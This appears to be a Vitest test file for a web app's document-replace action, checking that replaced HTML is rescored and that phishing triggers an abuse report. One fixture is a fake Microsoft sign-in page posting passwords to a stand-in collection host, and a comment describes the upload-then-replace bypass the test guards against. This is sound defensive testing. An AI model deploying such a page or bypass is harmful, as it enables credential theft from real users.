// Replacing a document is screened too.
//
// It is the fourth path that stores customer HTML and the only one that is not
// createDocumentForUser, so without this it would be the documented way round
// the upload screen: upload an empty page, get a link, replace the page with
// the phishing kit. This file covers that one action; the other server actions
// in the same module are not its subject.

import { beforeEach, describe, expect, it, vi } from 'vitest';

const USER = '00000000-0000-4000-8000-000000000001';
const DOC = '11111111-1111-4111-8111-111111111111';

const state = vi.hoisted(() => ({
  updates: [] as Record<string, unknown>[],
  rejectScreenColumns: false,
  redirectedTo: null as string | null,
}));

vi.mock('next/navigation', () => ({
  redirect: (to: string) => {
    state.redirectedTo = to;
    throw new Error('NEXT_REDIRECT');
  },
}));
vi.mock('next/cache', () => ({ revalidatePath: vi.fn() }));
vi.mock('@/lib/events', () => ({ captureServerEvent: vi.fn(async () => undefined) }));
vi.mock('@/lib/quota', () => ({ readQuota: async () => ({ atCap: false, used: 0 }) }));
vi.mock('@/lib/preview-token', () => ({
  issueOwnerDocPreviewToken: async () => 'tok',
  issueOwnerPreviewToken: async () => 'tok',
}));
vi.mock('@/lib/r2', () => ({
  r2Key: (userId: string, docId: string, v: number) => `docs/${userId}/${docId}/v${v}.html`,
  uploadHtml: vi.fn(async () => undefined),
  uploadAttachment: vi.fn(async () => undefined),
  deleteR2Object: vi.fn(async () => undefined),
}));

vi.mock('@/lib/supabase-server', () => ({
  requireUser: async () => ({ id: USER }),
  serverClient: () => ({
    from: (table: string) => ({
      select: () => ({
        eq: () => ({
          single: async () => ({
            data: {
              id: DOC,
              owner_id: USER,
              source_type: 'upload',
              current_version: 1,
              deleted_at: null,
            },
            error: null,
          }),
        }),
      }),
      insert: async () => ({ error: null }),
      update: (values: Record<string, unknown>) => ({
        eq: () => ({
          eq: async () => {
            if (state.rejectScreenColumns && 'screen_score' in values) {
              return {
                error: {
                  message:
                    "Could not find the 'screen_score' column of 'documents' in the schema cache",
                },
              };
            }
            state.updates.push({ table, ...values });
            return { error: null };
          },
        }),
      }),
    }),
  }),
}));

import { replaceDocumentAction } from './actions';

const PHISHING = `<html><head><title>Sign in to Microsoft</title></head><body>
  <h1>Sign in</h1><p>Your Office 365 session has expired.</p>
  <form action="https://collect.example-bad.tk/p.php" method="post">
    <input type="password" name="passwd">
  </form></body></html>`;

const BENIGN = '<html><body><h1>Q3 update</h1></body></html>';

function formDataFor(html: string): FormData {
  const fd = new FormData();
  fd.set('document_id', DOC);
  fd.set('file', new File([html], 'deck.html', { type: 'text/html' }));
  return fd;
}

async function replace(html: string): Promise<void> {
  // The action always ends in a redirect, which the mock above turns into a
  // throw exactly as Next does.
  await expect(replaceDocumentAction(formDataFor(html))).rejects.toThrow('NEXT_REDIRECT');
}

let fetchMock: ReturnType<typeof vi.fn>;

beforeEach(() => {
  state.updates = [];
  state.rejectScreenColumns = false;
  state.redirectedTo = null;
  process.env['SUPABASE_URL'] = 'https://project.supabase.co';
  process.env['SUPABASE_SERVICE_ROLE_KEY'] = 'service-role-key';
  fetchMock = vi.fn();
  fetchMock.mockResolvedValue({ ok: true, status: 201 });
  vi.stubGlobal('fetch', fetchMock);
});

function abuseInserts() {
  return fetchMock.mock.calls.filter(([url]) => String(url).endsWith('/rest/v1/abuse_reports'));
}

describe('replaceDocumentAction — the upload screen', () => {
  it('rescores the document on every replace', async () => {
    await replace(BENIGN);
    expect(state.redirectedTo).toBe(`/docs/${DOC}?replaced=1`);
    expect(state.updates[0]).toMatchObject({ screen_score: 0, screen_signals: [] });
    expect(abuseInserts()).toEqual([]);
  });

  it('flags a replace that swaps an innocent page for a phishing kit', async () => {
    await replace(PHISHING);
    expect(state.redirectedTo).toBe(`/docs/${DOC}?replaced=1`);
    expect(state.updates[0]?.['screen_score']).toBeGreaterThanOrEqual(50);
    expect(abuseInserts()).toHaveLength(1);
    const body = JSON.parse(String((abuseInserts()[0] as [string, RequestInit])[1].body)) as Record<
      string,
      string
    >;
    expect(body['document_id']).toBe(DOC);
    expect(body['reason']).toBe('phishing');
  });

  it('still replaces the document when schema/039 is not applied', async () => {
    state.rejectScreenColumns = true;
    await replace(BENIGN);
    expect(state.redirectedTo).toBe(`/docs/${DOC}?replaced=1`);
    expect(state.updates[0]).not.toHaveProperty('screen_score');
    expect(state.updates[0]).toMatchObject({ current_version: 2 });
  });
});
